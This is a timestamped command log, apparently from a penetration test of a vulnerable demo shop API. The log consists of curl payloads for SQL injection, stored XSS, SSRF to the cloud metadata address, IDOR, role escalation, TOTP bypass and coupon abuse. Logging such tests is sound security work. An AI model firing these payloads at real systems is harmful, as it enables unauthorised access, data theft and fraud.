# Command History Log
# Format: TIMESTAMP | PHASE | TARGET | CMD

2026-08-01T10:00:00Z | RECON | duck-store.escape.tech | BLOCK: nmap -sV duck-store.escape.tech
2026-08-01T10:01:00Z | RECON | duck-store.escape.tech | curl -s https://duck-store.escape.tech/api/v1/docs
2026-08-01T10:02:00Z | RECON | duck-store.escape.tech | curl -s https://duck-store.escape.tech/api/v1/openapi.json
2026-08-01T10:10:00Z | VULN_RESEARCH | duck-store.escape.tech | curl -X POST https://duck-store.escape.tech/api/v1/auth/login -d '{"username":"admin","password":"password"}'
2026-08-01T10:15:00Z | VULN_RESEARCH | duck-store.escape.tech | curl -X POST https://duck-store.escape.tech/api/v1/auth/login/totp -d '{"TOTPSecret":""}'
2026-08-01T10:20:00Z | EXPLOITATION | duck-store.escape.tech | curl -H "Authorization: Bearer eyJ0..." https://duck-store.escape.tech/api/v1/users/other-uuid
2026-08-01T10:25:00Z | EXPLOITATION | duck-store.escape.tech | curl -X PUT https://duck-store.escape.tech/api/v1/users/me/profile -d '{"role":"admin"}'
2026-08-01T10:30:00Z | EXPLOITATION | duck-store.escape.tech | curl -X POST https://duck-store.escape.tech/api/v1/orders/checkout -d '{"coupon":"FREEDUCK","discount":"100"}'
2026-08-01T10:35:00Z | EXPLOITATION | duck-store.escape.tech | curl -X POST https://duck-store.escape.tech/api/v1/auth/register -d '{"referrer":"self","referral":"self"}'
2026-08-01T10:40:00Z | EXPLOITATION | duck-store.escape.tech | curl "https://duck-store.escape.tech/api/v1/products/filter/by-color?color=red' OR 1=1--"
2026-08-01T10:45:00Z | EXPLOITATION | duck-store.escape.tech | curl -X POST https://duck-store.escape.tech/api/v1/testimonials/ -d '{"guest_avatar_url":"<script>alert(1)</script>"}'
2026-08-01T10:50:00Z | EXPLOITATION | duck-store.escape.tech | curl -X POST https://duck-store.escape.tech/api/v1/uploads/import-from-url -d '{"url":"http://169.254.169.254"}'
2026-08-01T10:55:00Z | EXPLOITATION | duck-store.escape.tech | curl "https://duck-store.escape.tech/api/v1/uploads/fetch-url?url=http://internal"
2026-08-01T11:00:00Z | EXPLOITATION | duck-store.escape.tech | curl -X PUT https://duck-store.escape.tech/api/v1/testimonials/1 -d '{"content":"modified"}'
2026-08-01T11:05:00Z | EXPLOITATION | duck-store.escape.tech | curl https://duck-store.escape.tech/api/v1/orders/42
2026-08-01T11:10:00Z | EXPLOITATION | duck-store.escape.tech | curl https://duck-store.escape.tech/api/v1/admin/users
